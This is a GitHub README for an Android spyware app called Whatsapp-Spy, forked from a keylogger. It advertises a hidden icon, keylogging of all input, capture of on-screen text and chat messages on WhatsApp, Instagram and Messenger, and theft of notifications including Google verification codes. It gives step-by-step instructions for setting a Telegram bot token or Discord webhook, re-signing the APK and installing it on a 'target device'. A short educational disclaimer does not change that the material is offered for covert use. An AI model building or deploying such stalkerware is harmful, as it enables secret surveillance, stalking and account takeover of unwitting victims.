![GitHub Repo stars](https://img.shields.io/github/stars/wellrodrig/Whatsapp-Spy)   ![GitHub forks](https://img.shields.io/github/forks/wellrodrig/Whatsapp-Spy)   ![GitHub followers](https://img.shields.io/github/followers/wellrodrig)  




# WARNING
> [!CAUTION]
This open-source project is intended for educational and research purposes only. By using this software, you acknowledge and agree that:
* User Responsibility: You, the user, bear full responsibility for how you utilize this software.
* Legality: Installing or using this software on devices owned by third parties without their explicit consent is illegal and constitutes a violation of privacy laws.

* Creator Disclaimer: The creator and contributors of this project are not liable for any misuse or unlawful actions conducted by users of this software.

## Features
✔️ full launcher stealth with no app icon on the home screen or launcher

✔️ one a a kind custom buffers for improved logging readability

✔️ sends notifications even while in a locked state (grabs google code before owner sees it) - (Optimized the code from the original project for better performance (read more at references.)

✔️ grabs all text on the screen the user is looking at. (except images)

✔️ keylogs all user input, even external and remote keyboards

✔️ Logs the text within message balloons whenever the user clicks on them (such as when long-pressing to reply or forward the message).

✔️ Works on Whatsapp/Whatsapp Business, Instagram and Messenger

✔️ You can choose to send logs either through Discord webhooks or the Telegram API.

## Instalation

1. __Telegram:__
    * Download APK file.
    * To decompile the APK, open it in an APK Editor like [APKToolGUI](https://github.com/AndnixSH/APKToolGUI) or [APK Editor Studio](https://github.com/kefir500/apk-editor-studio).
    * Open the decompilation folder and find the file named `MyAccessibilityService$MessageSender.smali`.
    * Search for a file `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` and replace it with your correspondent bot token and chat ID.
    * Compile and sign apk. 
    * Install on target device. 
    * You __must__ enable it in the accessibility settings.

1. __Discord:__
    * Download APK file.
    * To decompile the APK, open it in an APK Editor like [APKToolGUI](https://github.com/AndnixSH/APKToolGUI) or [APK Editor Studio](https://github.com/kefir500/apk-editor-studio).
    * Open the decompilation folder and find the file named `MyAccessibilityService$MessageSender.smali`.
    * Search for `YOUR_DISCORD_WEBHOOK_URL` and replace it with your correspondent BOT URL you got it from Discord.
    * Compile and sign apk.
    * Install on target device.
    * You __must__ enable it in the accessibility settings.

If everything went ok, you should receive on discord or telegram chat a message containing some data of the cellphone that the app was installed on. 

<img src="/../main/images/Enabling%20Acessibility%20Service.gif" alt="Image of a whatsapp chat" width="430">


## Images
* Exemple of a whatsapp chat ↓
  
<img src="/../main/images/Whatsapp.jpg" alt="Image of a whatsapp chat" width="430">

* How it looks on Discord ↓

<img src="/../main/images/Discord%20Exemple.png" alt="Exemple of how it displays on discord using webhook" width="430">

* How it looks on Telegram ↓

<img src="/../main/images/Telegram%20Exemple.png" alt="Exemple of how it displays on Telegram API" width="430">

* How it looks when the user taps on a text balloon, button, or any other element on the screen ↓

<img src="/../main/images/When%20user%20taps%20on%20some%20element%20of%20the%20screen.png" alt="How it looks when the user taps on a text balloon" width="430">

## References
This project is a fork of another keylogger called [PounceKeys](https://github.com/NullPounce/pounce-keys/) with about 50% of its code modified to enhance logging capabilities, such as improving data storage in the buffer and handling notifications more effectively. The current version of MyAccessibilityServices has grown by approximately 120 lines, with a focus on social media platforms like WhatsApp and Instagram. The APK and source code are currently unavailable as I am making ongoing adjustments, but they will be released soon. However, I am uncertain about the project's long-term viability, as the original project, PounceKeys, remains highly active (sort of).
Depending on how this goes, I'll be implementing some features, which I'll discuss in the next section.

## Roadmap
- [x] 1. Improve `handleNotificationChangedEvent` method
     * The code on the original project was too simples, so i've made some changes:
         * __Detailed Notification Extraction__: My code extracts detailed information from the notification object (title, text, subtext, big text). This provides more comprehensive and structured notification content.
         * __Fallback Mechanism__: If the notification object is null, it falls back to appending the notification text, ensuring that no information is lost.
         * __Readability and Context__: By appending more structured and detailed information, the log messages are more informative and readable.

- [x] 2. Improved `handleTextChangedEvent` method
     * The code on the original project was good enough but I still made some changes:
         * __Efficiency__: My code accumulates new text in a StringBuilder (buffer) and appends it to currentKeyEvents only once after processing all text changes. This reduces the number of StringBuilder operations, which can be more efficient.
         * __Flag Check__: The use of the newTextAdded flag ensures that currentKeyEvents is only updated if new text was actually added, avoiding unnecessary operations and checks.
         * __Readability and Maintainability__: Code's separation of concerns (accumulating new text first, then appending it) makes the logic clearer and easier to maintain.
- [ ] 3. The code needs refactoring
     * The code needs refactoring because some blocks are confusing and hard to understand. Refactoring will help eliminate inconsistencies and redundancies, making the code more readable, maintainable, and efficient.
- [ ] 4. Screenshot feature
    * I will attempt to implement a functionality that takes a screenshot of the app's home page occasionally when the user opens the app, using _almost_ only accessibility services.
- [x] 5. Lower the amount of logs generated.
    * ~~Currently, whenever the user opens WhatsApp, Instagram, or Messenger, the app captures all visible text on the screen and sends it to either Discord or Telegram. Additionally, a new log is generated every time the user navigates back to the home page, clicks on a chat, views statuses, or accesses calls. This process needs to be optimized to reduce the volume of logs and enhance readability.~~
    * Done. The app now filters out duplicate logs within a 10-minute timeframe. A confirmation message is displayed, and the processed data is retained for this duration before being erased.
